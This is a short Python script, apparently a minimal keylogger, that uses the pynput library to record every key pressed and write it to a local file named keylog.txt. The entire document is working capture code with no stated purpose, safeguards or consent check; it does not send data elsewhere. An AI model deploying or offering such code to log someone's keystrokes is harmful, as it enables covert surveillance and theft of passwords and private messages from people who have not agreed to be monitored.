from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG)
 
def pressing(key):
    logging.info(str(key))
 
with Listener(on_press=pressing) as listener :
    listener.join()